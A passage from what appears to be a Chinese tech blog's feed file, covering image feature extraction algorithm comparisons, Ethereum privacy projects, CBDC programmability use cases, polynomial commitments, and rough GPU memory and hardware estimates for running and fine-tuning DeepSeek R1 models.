<li>存在明显问题的团队，组织针对性改进辅导。</li>
</ul>
<h2 id="四、预期效果"><a href="#四、预期效果" class="headerlink" title="四、预期效果"></a>四、预期效果</h2><ul>
<li>保持开发与运维的效率、稳定性双平衡。</li>
<li>确保监管合规性，同时保证技术与业务的快速响应能力。</li>
<li>促进组织持续改善，实现稳定高效的整体技术管理水平。</li>
</ul>
<h3 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link:"></a>Reference link:</h3><p><a href="https://dora.dev/capabilities/">https://dora.dev/capabilities/</a></p>
]]></content>
      <tags>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>图片特性提取的算法</title>
    <url>/2024/07/18/%E5%9B%BE%E7%89%87%E7%89%B9%E6%80%A7%E6%8F%90%E5%8F%96%E7%9A%84%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th><strong>比较项目</strong></th>
<th><strong>SIFT</strong></th>
<th><strong>CLIP 模型</strong></th>
<th><strong>OpenCV 和 SSIM</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>特征类型</strong></td>
<td>局部特征点和描述符（关键点、边缘）</td>
<td>高维特征向量（512维），包含物体、场景、语义、颜色、形状等信息</td>
<td>全局结构相似性（亮度、对比度、结构）</td>
</tr>
<tr>
<td><strong>算法特点</strong></td>
<td>尺度不变性、旋转不变性、对光照变化鲁棒</td>
<td>多模态（图像和文本联合训练）、高语义理解、跨模态能力</td>
<td>感知驱动、结构相似性评估</td>
</tr>
<tr>
<td><strong>计算复杂度</strong></td>
<td>高，适合离线处理</td>
<td>中等到高，依赖 GPU，适合实时处理</td>
<td>低到中，适合实时处理</td>
</tr>
<tr>
<td><strong>应用场景</strong></td>
<td>图像拼接、物体识别、精确图像匹配</td>
<td>图像搜索、图像分类、跨模态任务</td>
<td>图像质量评估、图像压缩、变化检测</td>
</tr>
<tr>
<td><strong>鲁棒性</strong></td>
<td>对尺度、旋转、光照变化具有鲁棒性</td>
<td>对多种视觉变化具有鲁棒性</td>
<td>对整体结构变化具有鲁棒性</td>
</tr>
<tr>
<td><strong>依赖库</strong></td>
<td>OpenCV（包含 SIFT 算法实现）</td>
<td>transformers 库（Hugging Face 提供的 CLIP 模型实现）</td>
<td>OpenCV（图像处理）和 skimage（SSIM 计算）</td>
</tr>
<tr>
<td><strong>输出形式</strong></td>
<td>关键点位置和描述符，匹配的关键点对</td>
<td>高维特征向量，语义相似性得分</td>
<td>SSIM 得分（-1 到 1），结构差异图</td>
</tr>
<tr>
<td><strong>易用性</strong></td>
<td>需要一定的图像处理和计算机视觉知识</td>
<td>需要了解深度学习模型和预训练模型的使用方法</td>
<td>易于使用，适合初学者和快速应用</td>
</tr>
<tr>
<td><strong>性能评估</strong></td>
<td>精确度高，但计算时间长</td>
<td>精确度高，计算效率高</td>
<td>精确度适中，计算效率高</td>
</tr>
<tr>
<td><strong>开发和维护</strong></td>
<td>较成熟，算法稳定，但需要大量计算资源</td>
<td>持续更新，模型性能不断提升，但依赖最新的深度学习框架</td>
<td>成熟稳定，依赖基础图像处理库</td>
</tr>
<tr>
<td><strong>示例代码片段</strong></td>
<td><code>sift = cv2.SIFT_create()</code><br><code>kp, des = sift.detectAndCompute(image, None)</code></td>
<td><code>model = CLIPModel.from_pretrained(&quot;openai/clip-vit-base-patch32&quot;)</code><br><code>features = model.get_image_features(inputs)</code></td>
<td><code>score, diff = ssim(image1, image2, full=True)</code></td>
</tr>
<tr>
<td><strong>模型更新频率</strong></td>
<td>由于算法经典，更新频率低</td>
<td>持续更新，引入更多数据集和改进</td>
<td>算法稳定，更新频率低</td>
</tr>
<tr>
<td><strong>社区支持</strong></td>
<td>较强，广泛应用于计算机视觉研究和工程实践</td>
<td>强大，特别是在 NLP 和 CV 领域的多模态研究</td>
<td>强大，广泛应用于图像处理和分析</td>
</tr>
<tr>
<td><strong>资源需求</strong></td>
<td>高 CPU 和内存需求，处理大图像数据时尤其明显</td>
<td>高 GPU 和内存需求，适合使用高性能计算资源</td>
<td>较低的资源需求，适合各种计算环境</td>
</tr>
</tbody></table>
<p>通过这个表格，可以更全面地比较 SIFT 算法、CLIP 模型和 OpenCV 与 SSIM 方法在图像特征提取与比较上的不同特点。这个表格包含了特征类型、算法特点、计算复杂度、应用场景、鲁棒性、依赖库、输出形式、易用性、性能评估、开发和维护、示例代码片段、模型更新频率、社区支持以及资源需求等多个比较项目。</p>
<p>除了 SIFT、CLIP 和 SSIM 之外，还有许多其他算法和方法可以用于图像特征提取。以下是一些常见的算法及其特点：</p>
<table>
<thead>
<tr>
<th><strong>算法</strong></th>
<th><strong>特征类型</strong></th>
<th><strong>特点</strong></th>
<th><strong>应用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>SURF (Speeded-Up Robust Features)</strong></td>
<td>局部特征点和描述符</td>
<td>比 SIFT 更快，鲁棒性稍差，但仍对尺度、旋转不变</td>
<td>物体识别、图像拼接</td>
</tr>
<tr>
<td><strong>ORB (Oriented FAST and Rotated BRIEF)</strong></td>
<td>局部特征点和描述符</td>
<td>快速高效，对旋转不变，但对尺度不变性较差</td>
<td>实时应用、移动设备</td>
</tr>
<tr>
<td><strong>HOG (Histogram of Oriented Gradients)</strong></td>
<td>形状和边缘方向直方图</td>
<td>捕捉局部的梯度方向直方图，适用于检测对象的形状和轮廓</td>
<td>人体检测、物体检测</td>
</tr>
<tr>
<td><strong>LBP (Local Binary Patterns)</strong></td>
<td>纹理特征</td>
<td>快速简便，对纹理特征敏感，适合纹理分类和检测</td>
<td>纹理分类、图像分割</td>
</tr>
<tr>
<td><strong>Gabor Filters</strong></td>
<td>频域特征</td>
<td>通过多尺度和多方向的滤波器捕捉图像中的纹理和边缘</td>
<td>纹理分析、边缘检测</td>
</tr>
<tr>
<td><strong>Deep Learning Features (CNNs)</strong></td>
<td>高维特征向量</td>
<td>通过卷积神经网络提取图像的高维特征，适用于复杂的视觉任务</td>
<td>图像分类、对象检测、图像分割</td>
</tr>
<tr>
<td><strong>PCA (Principal Component Analysis)</strong></td>
<td>主成分特征</td>
<td>通过降维技术提取图像的主要特征，减少数据维度</td>
<td>数据降维、特征压缩</td>
</tr>
<tr>
<td><strong>LDA (Linear Discriminant Analysis)</strong></td>
<td>判别特征</td>
<td>通过线性判别分析提取最能区分类别的特征</td>
<td>分类任务、特征选择</td>
</tr>
<tr>
<td><strong>Wavelet Transform</strong></td>
<td>多尺度分析特征</td>
<td>通过小波变换分析图像的多尺度信息，适用于纹理和边缘检测</td>
<td>纹理分析、图像压缩</td>
</tr>
<tr>
<td><strong>Color Histograms</strong></td>
<td>颜色分布特征</td>
<td>统计图像中不同颜色的分布，适用于图像的颜色分析和匹配</td>
<td>图像检索、颜色分析</td>
</tr>
<tr>
<td><strong>Edge Detection (Canny, Sobel)</strong></td>
<td>边缘特征</td>
<td>检测图像中的边缘，捕捉物体的轮廓和形状</td>
<td>边缘检测、形状分析</td>
</tr>
<tr>
<td><strong>Daisy Descriptors</strong></td>
<td>局部图像描述符</td>
<td>捕捉图像的局部特征，类似 SIFT 和 SURF，但更快</td>
<td>物体识别、图像匹配</td>
</tr>
<tr>
<td><strong>BRISK (Binary Robust Invariant Scalable Keypoints)</strong></td>
<td>局部特征点和描述符</td>
<td>快速、鲁棒，对旋转和尺度变化具有不变性</td>
<td>实时应用、移动设备</td>
</tr>
<tr>
<td><strong>FREAK (Fast Retina Keypoint)</strong></td>
<td>局部特征点和描述符</td>
<td>快速、有效，模仿人眼视网膜的工作方式</td>
<td>实时应用、移动设备</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>图片处理</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Ethereum的隐私方案</title>
    <url>/2019/12/27/%E5%9F%BA%E4%BA%8EEthereum%E7%9A%84%E9%9A%90%E7%A7%81%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>参考链接 ==&gt; <a href="https://github.com/primasio/daap/blob/master/README-cn.md">https://github.com/primasio/daap/blob/master/README-cn.md</a></p>
<ul>
<li>安永（EY）之前发布的<a href="https://github.com/EYBlockchain/nightfall">Nightfall</a>项目，实现了对以太坊上ERC-721类资产私密转账的支持。但是ERC-721的使用使得资产的注册是必须公开的，在资产注册以后转入一个私密合约，之后的转移操作才是对外不可见的。另外，对于文章、图片等类型的数字资产，最重要的流通方式不是所有权的转移，而是使用权的购买。比如文章的转载权购买、图片的购买使用等。对于这类数字资产，使用NFT模型抽象是不够的，也就更加无法实现使用权的私密购买。</li>
<li><a href="https://github.com/Zokrates/ZoKrates">ZoKrates</a>工具包中，具体的零知识证明算法使用了<a href="https://eprint.iacr.org/2016/260.pdf">Groth 16</a>。实现协议时也可以使用<a href="https://github.com/zkcrypto/bellman">Bellman</a>工具包,或者将算法替换为<a href="https://github.com/dalek-cryptography/bulletproofs">Bulletproofs</a>或者是<a href="https://eprint.iacr.org/2019/099">Sonic</a>算法，以实现更好的性能，以及去除对可信初始化的依赖。</li>
<li><a href="https://github.com/AztecProtocol/AZTEC">AZTEC协议</a> 实现了基于ERC20资产的交易值隐私。易于同态加密和零知识证明算法。目前已经在MakerDAO的 DAI token 中上线使用。同时，在<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1108.md">EIP1108</a>中予以完成。</li>
</ul>
]]></content>
      <tags>
        <tag>Ethereum</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>央行数字货币的可编程性到底可以做什么</title>
    <url>/2024/11/11/%E5%A4%AE%E8%A1%8C%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E7%9A%84%E5%8F%AF%E7%BC%96%E7%A8%8B%E6%80%A7%E5%88%B0%E5%BA%95%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88/</url>
    <content><![CDATA[<p>Programmability in the context of Central Bank Digital Currencies (CBDCs) refers to the capacity to embed smart contract-like features directly into the digital currency. This would allow CBDCs to automatically execute rules or conditions when specific criteria are met, enabling more advanced use cases and controls.<br>Here are some practical <strong>business cases</strong> where the programmability of CBDCs could have significant impact:</p>
<p><strong>1. Supply Chain Finance and Trade Settlement</strong><br>供应链金融和贸易结算<br>In supply chain finance, CBDCs could be programmed to release payments automatically at each stage of production or delivery. For example:<br>• <em>Smart Contracts for Automatic Payment</em>: A CBDC could be programmed to release funds when a shipment reaches a specific location or when an IoT-enabled device confirms the delivery of goods.<br>• <em>International Trade Compliance</em>: By incorporating compliance checks within the CBDC, customs duties and taxes could be deducted automatically, while ensuring adherence to trade regulations, improving speed, and reducing paperwork.</p>
<p><strong>2. Conditional Government Aid and Welfare Programs</strong><br>有条件的政府援助和福利计划<br>Governments can disburse funds directly through programmable CBDCs with built-in conditions for usage. This use case would:<br>• <em>Ensure Targeted Spending</em>: Welfare payments could be restricted to authorized merchants or for specific categories (e.g., groceries, health services), reducing misuse and ensuring assistance reaches the intended recipients.<br>• <em>Automatic Expiration or Limits</em>: To encourage timely spending, certain stimulus payments could have expiration dates or be programmed to prevent hoarding, boosting economic activity.</p>
<p><strong>3. Automated Tax Collection for Businesses and Consumers</strong><br>企业和消费者自动征税<br>For businesses, CBDCs can simplify tax compliance through automated deductions:<br>• <em>Real-Time Tax Deduction</em>: Taxes could be deducted in real-time during each transaction, simplifying tax compliance and reducing the administrative burden for small businesses.<br>• <em>VAT and Sales Tax</em>: CBDCs could automatically calculate and remit VAT or sales tax directly to government accounts, reducing errors and ensuring compliance.</p>
<p><strong>4. Real Estate and Asset Tokenization</strong><br>房地产和资产代币化<br>Programmable CBDCs can streamline large, complex transactions like real estate purchases:<br>• <em>Escrow Mechanisms for Property Sales</em>: CBDCs can serve as programmable escrow funds, where funds are only released when all contractual conditions, like title transfer or inspections, are fulfilled.<br>• <em>Fractional Ownership and Dividends</em>: Asset tokenization (e.g., in real estate) could enable CBDCs to automatically distribute dividends to token holders, representing fractional property ownership.</p>
<p><strong>5. Cross-Border Trade and Remittances</strong><br>跨境贸易和汇款<br>CBDCs can simplify cross-border payments by integrating automatic conversion and compliance features:<br>• <em>Instant Cross-Currency Settlement</em>: Programmable CBDCs could automatically convert funds to the recipient’s currency, applying relevant fees or exchange rates instantly.<br>• <em>Compliance Checks for AML/KYC</em>: Programmable CBDCs could enforce AML/KYC requirements by automatically flagging suspicious activity, reducing regulatory risk and speeding up international transactions.</p>
<p><strong>6. Subscription Payments and Recurring Services</strong><br>订阅付款和定期服务<br>CBDCs could automate recurring payments in subscription-based business models:<br>• <em>Automated Subscription Management</em>: CBDCs could be programmed for regular, automated payments (e.g., streaming services, SaaS platforms), simplifying billing and reducing the risk of service disruptions.<br>• <em>Usage-Based Pricing</em>: CBDCs could support “pay-as-you-go” pricing models where charges are automatically applied based on usage, especially useful for cloud services or utilities.</p>
<p><strong>7. Capital Markets and Wholesale CBDC Use Cases</strong><br>资本市场和批发 CBDC 用例<br>For wholesale CBDCs, programmability opens new avenues in capital markets:<br>• <em>Automated Clearing and Settlement</em>: CBDCs could eliminate the need for intermediaries by automatically executing settlements upon matching transaction records between two parties.<br>• <em>Repo and Derivatives Markets</em>: CBDCs can streamline collateral management by automatically adjusting collateral requirements, executing margin calls, or managing repos in real-time based on market fluctuations.</p>
<p><strong>8. Reward Programs and Customer Loyalty</strong><br>奖励计划和客户忠诚度<br>Businesses could use programmable CBDCs for customer reward programs:<br>• <em>Automatic Loyalty Points</em>: CBDCs could be programmed to add loyalty points automatically for every purchase, simplifying the customer experience.<br>• <em>Conditional Rewards</em>: Rewards could be programmed to expire or apply only to specific purchases, making it easy to customize loyalty offers for each customer segment.</p>
<p><strong>9. Carbon Credit and Green Finance</strong><br>碳信用和绿色金融<br>CBDCs could play a role in incentivizing environmentally sustainable behavior:<br>• <em>Carbon Credit Trading</em>: CBDCs could enable automated carbon credit settlements between companies, enforcing green finance commitments.<br>• <em>Green Rewards</em>: Government programs could incentivize green purchases by programming CBDCs to offer discounts or rewards for sustainable activities, such as using public transport or purchasing eco-friendly products.<br>These use cases highlight how CBDC programmability could drive efficiencies, automate compliance, and introduce innovative business models across multiple sectors, benefiting both businesses and consumers.</p>
<p>Programmable CBDCs offer interesting possibilities for end users to create custom payment solutions and manage <strong>personal</strong> finances in new ways. Here are a few examples:</p>
<p><strong>1. Personal Budgeting and Spending Controls</strong><br>个人预算和支出控制<br>• <strong>Automated Savings</strong> 自动储蓄: Users could program a portion of their income (e.g., 10%) to automatically transfer to a savings wallet whenever they receive a paycheck, supporting disciplined saving habits.<br>• <strong>Category-Based Spending Limits</strong> 消费归类: End users could set monthly spending caps for specific categories, such as dining out or entertainment, to better manage their budgets and spending behavior.<br>• <strong>Automatic Rounding for Savings</strong> 储蓄和消费预估: Each purchase could be rounded up to the nearest dollar, with the “extra” going to a savings or investment account—similar to popular savings apps.</p>
<p><strong>2. Shared Wallets for Families or Groups</strong><br>家庭或团体共享钱包<br>• <strong>Family Allowance System</strong>: Parents could set up programmable wallets for children, where funds are released for specific purposes, like school supplies or transportation. Funds could be set to expire if unused within a certain period, encouraging responsible spending.<br>• <strong>Household Expense Management</strong>: Roommates or couples could create a shared wallet programmed to split common expenses like rent, utilities, or groceries automatically, reducing manual tracking and making shared expenses more transparent.</p>
<p><strong>3. Charitable Donations with Conditions</strong><br>有条件的慈善捐赠<br>• <strong>Conditional Charity Donations</strong>: Users could set up automatic donations to charities that activate only when personal income exceeds a certain threshold, allowing them to give back when they are financially able.<br>• <strong>Transparent Donations</strong>: CBDCs could allow donors to see exactly when and how their funds are used by a charity, increasing transparency and engagement with the causes they support.</p>
<p><strong>4. Emergency Funds and Auto-Trigger Insurance</strong><br>应急资金和自动触发保险<br>• <strong>Self-Triggered Emergency Payments</strong>: Users could set up a programmable emergency fund to automatically transfer to their main wallet if their balance falls below a certain level.<br>• <strong>Automated Micro-Insurance Payments</strong>: End users could set up small automatic payments for emergency health or travel insurance, activating only when they cross country borders or travel a specified distance.</p>
<p><strong>5. Conditional Gifting and Allowances</strong><br>有条件的赠与和津贴<br>• <strong>Smart Gifting</strong>: CBDCs could allow users to set up gifts with conditions, such as funds for a child’s education that can only be used for tuition, books, or school supplies.<br>• <strong>Goal-Based Allowances</strong>: Parents could use programmable CBDCs to set up an allowance system that releases funds to their children only after achieving certain goals, like completing homework or chores.</p>
<p><strong>6. Automated Bill Splitting for Social Activities</strong><br>社交活动账单自动分摊<br>• <strong>Social Wallets</strong>: Friends could create a shared, programmable wallet for social events, where each person contributes, and funds are automatically allocated for event-specific expenses, like concert tickets or group dinners.<br>• <strong>Real-Time Expense Tracking</strong>: Programmed CBDCs could split expenses in real-time as they occur, making group activities financially smoother and removing the need for after-the-fact reimbursements.</p>
<p><strong>7. Customizable Travel Budgets and Currency Conversion</strong><br>可定制的旅行预算和货币兑换<br>• <strong>Vacation Budgeting</strong>: Travelers could allocate a specific budget for their trip, where funds automatically convert to the local currency and apply spending limits to ensure they stay within their set vacation budget.<br>• <strong>Location-Based Spending</strong>: Users could set geographic restrictions on their CBDC wallets, preventing them from spending funds outside a designated area or country, adding an extra layer of control and security for travel budgets.</p>
<p><strong>8. Personal Investment Automations</strong><br>个人投资自动化<br>• <strong>Recurring Investments</strong>: End users could program their CBDCs to allocate a small percentage of each paycheck into specific investments or savings accounts, making it easy to automate dollar-cost averaging.<br>• <strong>Goal-Based Investment Triggers</strong>: Users could set up a CBDC wallet to transfer funds to an investment account only if they’ve met other financial goals for the month, like saving or debt repayment targets.</p>
<p><strong>9. Incentivized Health and Wellness Programs</strong><br>激励健康和保健计划<br>• <strong>Rewards for Healthy Activities</strong>: End users could connect programmable CBDCs to health tracking apps to earn micro-payments for activities such as reaching a daily step goal, gym attendance, or purchasing healthy food.<br>• <strong>Goal-Based Health Savings</strong>: CBDCs could also be used to allocate funds to a “health fund” every time a fitness milestone is reached, rewarding users for making healthy choices.</p>
<p><strong>10. Flexible Subscription Management</strong><br>灵活的订阅管理<br>• <strong>Trial Periods with Expiry</strong>: End users could set up subscriptions to only renew if they actively confirm, helping avoid unwanted subscription charges.<br>• <strong>Family Subscription Pools</strong>: Users could program CBDCs to fund family-wide subscriptions where family members contribute proportionally, or enable automatic payments only if usage metrics meet certain thresholds.</p>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>图解二项式承诺</title>
    <url>/2021/04/07/%E5%9B%BE%E8%A7%A3%E4%BA%8C%E9%A1%B9%E5%BC%8F%E6%89%BF%E8%AF%BA/</url>
    <content><![CDATA[<p>Vitalik: An attempt at an explanation-in-pictures for how bulletproof-style polynomial commitments work (relevant to Halo and potentially future ethereum upgrades for better scalability) I welcome feedback! I’m trying to experiment with new approaches to make crypto math more intuitive.</p>
<p><img src="/2021/04/07/%E5%9B%BE%E8%A7%A3%E4%BA%8C%E9%A1%B9%E5%BC%8F%E6%89%BF%E8%AF%BA/1.jpg" alt="Image"></p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型要占用多少显存</title>
    <url>/2025/02/11/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%A6%81%E5%8D%A0%E7%94%A8%E5%A4%9A%E5%B0%91%E6%98%BE%E5%AD%98/</url>
    <content><![CDATA[<h2 id="部署要占用多少显存"><a href="#部署要占用多少显存" class="headerlink" title="部署要占用多少显存"></a>部署要占用多少显存</h2><p>以运行精度为 INT8 的大模型为例，这种精度的参数，一个参数需要占用一个字节。<br>$1B参数模型 = 10亿参数 * 每个参数占用1Byte$<br>$1G显存 = 1024<em>1024</em>1024Byte$<br>也就是说<br><strong>INT8 精度类型：1B 参数需要约 1G 显存。</strong></p>
<table>
<thead>
<tr>
<th>dtype</th>
<th align="center">1B模型需要占用的显存</th>
</tr>
</thead>
<tbody><tr>
<td>float32</td>
<td align="center">4G</td>
</tr>
<tr>
<td>fp16/bf16</td>
<td align="center">2G</td>
</tr>
<tr>
<td>int8</td>
<td align="center">1G</td>
</tr>
<tr>
<td>int4</td>
<td align="center">0.5G</td>
</tr>
<tr>
<td>然后就可以快速计算各个类型精度的大模型需要多少显存，例如 f16 的 70B 参数大模型，就需要“精度膨胀系数” 2*70=140G显存。</td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="训练要占用多少显存"><a href="#训练要占用多少显存" class="headerlink" title="训练要占用多少显存"></a>训练要占用多少显存</h2><p>这里还有另外一个在线的网页工具：<a href="https://huggingface.co/spaces/hf-accelerate/model-memory-usage">https://huggingface.co/spaces/hf-accelerate/model-memory-usage</a><br><img src="/2025/02/11/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%A6%81%E5%8D%A0%E7%94%A8%E5%A4%9A%E5%B0%91%E6%98%BE%E5%AD%98/1.jpg"></p>
<p>模型包括： DeepSeek R1 (671B)，DeepSeek R1 Distill Qwen 7B， 14B， 32B， 以及 DeepSeek R1 Distill Llama 8B， 70B 这些模型，</p>
<ol>
<li>假设在并发 3 个用户的情况下运行这些模型所需的资源？</li>
<li>关于 DeepSeek R1 系列模型在不同数据量下进行微调（并非全量训练），并在一天内完成微调所需的硬件资源。分别在 1K，1M，1GB，1T 数据量下训练这些模型所需的资源和训练时长。</li>
</ol>
<p>根据您提供的信息，以及之前的分析，以下是关于 DeepSeek R1 系列模型微调硬件资源需求的全面分析，并以表格形式呈现：</p>
<h2 id="DeepSeek-R1-模型微调硬件资源需求总表-单日内完成"><a href="#DeepSeek-R1-模型微调硬件资源需求总表-单日内完成" class="headerlink" title="DeepSeek R1 模型微调硬件资源需求总表 (单日内完成)"></a>DeepSeek R1 模型微调硬件资源需求总表 (单日内完成)</h2><p>采用BF16（2字节/参数）的情况下，考虑到 Unsloth 主要优化 LoRA 微调，并且更适用于单 GPU 或少量 GPU 场景，基于 Unsloth 优化 LoRA 微调的假设，重新评估 DeepSeek R1 系列模型在中小数据量 (1K, 1M, 1G, 10G) 下的硬件资源需求。 对于超大数据量 (100G) 和超大模型 (DeepSeek-R1-671B)，我仍然保留 ZeRO-3 优化。</p>
<table>
<thead>
<tr>
<th>模型</th>
<th>数据size</th>
<th>GPU 配置 (显存需求)</th>
<th>CPU 核心数</th>
<th>内存</th>
<th>存储 (SSD/NVMe)</th>
<th>网络带宽</th>
<th>关键配置说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>DeepSeek-R1-671B BF16</strong></td>
<td>1M</td>
<td>16×A100 80G</td>
<td>64核</td>
<td>512GB</td>
<td>2TB</td>
<td>25Gbps RDMA</td>
<td>模型并行 (TP=16) + 数据并行 (DP=2)</td>
</tr>
<tr>
<td></td>
<td>1G</td>
<td>64×A100 80G</td>
<td>256核</td>
<td>1TB</td>
<td>5TB</td>
<td>50Gbps RDMA</td>
<td>TP=8 + DP=8 + ZeRO-3</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>128×A100 80G</td>
<td>512核</td>
<td>2TB</td>
<td>10TB</td>
<td>100Gbps RDMA</td>
<td>TP=8 + DP=16 + ZeRO-3</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>192×A100 80G</td>
<td>768核</td>
<td>4TB</td>
<td>15TB</td>
<td>150Gbps RDMA</td>
<td>TP=8 + DP=24 + ZeRO-3</td>
</tr>
<tr>
<td><strong>Distill-Qwen-7B 4-bit</strong></td>
<td>1M</td>
<td>1×A10G 24G (Unsloth)</td>
<td>8核</td>
<td>64GB</td>
<td>500GB</td>
<td>1Gbps</td>
<td>单卡 4-bit LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>1G</td>
<td>2×A10G 24G (Unsloth)</td>
<td>16核</td>
<td>128GB</td>
<td>1TB</td>
<td>5Gbps</td>
<td>DP=2 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>4×A10G 24G (Unsloth)</td>
<td>32核</td>
<td>256GB</td>
<td>2TB</td>
<td>5Gbps</td>
<td>DP=4 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>8×A10G 24G (Unsloth)</td>
<td>64核</td>
<td>512GB</td>
<td>3TB</td>
<td>10Gbps</td>
<td>DP=8 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td><strong>Distill-Qwen-14B 4-bit</strong></td>
<td>1M</td>
<td>1×A100 40G (Unsloth)</td>
<td>16核</td>
<td>128GB</td>
<td>1TB</td>
<td>5Gbps</td>
<td>单卡 LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>1G</td>
<td>4×A100 40G (Unsloth)</td>
<td>32核</td>
<td>256GB</td>
<td>2TB</td>
<td>10Gbps</td>
<td>DP=4 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>8×A100 40G (Unsloth)</td>
<td>64核</td>
<td>512GB</td>
<td>3TB</td>
<td>10Gbps</td>
<td>DP=8 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>16×A100 40G (Unsloth)</td>
<td>128核</td>
<td>1TB</td>
<td>5TB</td>
<td>25Gbps</td>
<td>DP=16 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td><strong>Distill-Qwen-32B BF16</strong></td>
<td>1G</td>
<td>4×A100 80G (Unsloth)</td>
<td>64核</td>
<td>512GB</td>
<td>2TB</td>
<td>10Gbps</td>
<td>TP=4 + DP=2</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>8×A100 80G (Unsloth)</td>
<td>128核</td>
<td>1TB</td>
<td>3TB</td>
<td>25Gbps</td>
<td>DP=8 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>32×A100 80G</td>
<td>256核</td>
<td>2TB</td>
<td>10TB</td>
<td>50Gbps RDMA</td>
<td>TP=4 + DP=8 + ZeRO-3</td>
</tr>
<tr>
<td><strong>Distill-Llama-8B 4-bit</strong></td>
<td>1M</td>
<td>1×A10G 24G (Unsloth)</td>
<td>8核</td>
<td>64GB</td>
<td>500GB</td>
<td>1Gbps</td>
<td>单卡 LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>1G</td>
<td>2×A10G 24G (Unsloth)</td>
<td>16核</td>
<td>128GB</td>
<td>1TB</td>
<td>5Gbps</td>
<td>DP=2 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>4×A10G 24G (Unsloth)</td>
<td>32核</td>
<td>256GB</td>
<td>2TB</td>
<td>5Gbps</td>
<td>DP=4 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>8×A10G 24G (Unsloth)</td>
<td>48核</td>
<td>384GB</td>
<td>3TB</td>
<td>10Gbps</td>
<td>DP=8 + LoRA 微调 (Unsloth)</td>
</tr>
<tr>
<td><strong>Distill-Llama-70B BF16</strong></td>
<td>1M</td>
<td>8×A100 80G</td>
<td>64核</td>
<td>512GB</td>
<td>2TB</td>
<td>25Gbps RDMA</td>
<td>TP=4 + DP=2 (ZeRO-3 for 70B still recommended)</td>
</tr>
<tr>
<td></td>
<td>1G</td>
<td>32×A100 80G</td>
<td>128核</td>
<td>1TB</td>
<td>5TB</td>
<td>25Gbps RDMA</td>
<td>TP=4 + DP=8 (ZeRO-3 for 70B still recommended)</td>
</tr>
<tr>
<td></td>
<td>10G</td>
<td>64×A100 80G</td>
<td>256核</td>
<td>2TB</td>
<td>10TB</td>
<td>50Gbps RDMA</td>
<td>TP=8 + DP=8 + ZeRO-3</td>
</tr>
<tr>
<td></td>
<td>100G</td>
<td>128×A100 80G</td>
<td>512核</td>
<td>4TB</td>
<td>15TB</td>
<td>100Gbps RDMA</td>
<td>TP=8 + DP=16 + ZeRO-3</td>
</tr>
</tbody></table>
<p><strong>GPU 配置 (显存需求)</strong>: 指完成微调任务所需的 GPU 型号和数量，以及总显存需求。例如 “16×A100 80G” 表示需要 16 张 80GB 显存的 A100 GPU。<br><strong>CPU 核心数</strong>: 训练任务所需的 CPU 核心数量，主要用于数据预处理和模型管理。<br><strong>内存</strong>: 系统内存需求，用于数据缓存、模型加载和训练过程中的临时数据存储。<br><strong>存储 (SSD/NVMe)</strong>: 高速固态硬盘容量需求，用于存储训练数据、模型参数和中间结果。NVMe SSD 提供更快的读写速度，适用于大数据量训练。<br><strong>网络带宽</strong>: 多 GPU 训练时所需的网络带宽，用于 GPU 之间的数据通信。RDMA (Remote Direct Memory Access) 网络提供更低的延迟和更高的带宽，适用于大规模分布式训练。<br><strong>关键配置说明</strong>: 简要描述了针对不同模型和数据量所采用的关键并行策略和优化技术，例如模型并行 (TP)、数据并行 (DP)、ZeRO-3 优化和梯度累积等。<br><strong>预估并发 3 用户显存需求</strong>: 粗略估计为模型参数显存占用的 3 倍或更高。因为并发用户需要模型的多份副本或共享模型但需要额外的上下文缓存等。实际情况可能更复杂。</p>
<ol>
<li><strong>Unsloth 对资源需求的影响</strong>:<ul>
<li><strong>中小模型 (Distill-Qwen-7B/14B/32B, Distill-Llama-8B) 和中小数据量 (1K - 100G)</strong>: 使用 Unsloth 库进行 LoRA 微调，可以显著降低 GPU 资源需求。例如，Distill-Qwen-7B 在 1K 数据量下，单张 A10G 24G 即可完成微调；即使在 100G 数据量下，也仅需 8 张 A10G 24G GPU。</li>
<li><strong>超大模型 (DeepSeek-R1-671B) 和大数据量 (100G)</strong>: 对于这些极端情况，Unsloth 的优化可能不足以完全解决显存瓶颈。因此，表格中仍然保留了 ZeRO-3 优化，并结合 Unsloth 的 FlashAttention-2 优化，以期达到最佳的性能和资源效率。</li>
</ul>
</li>
<li><strong>LoRA 微调的优势</strong>:<ul>
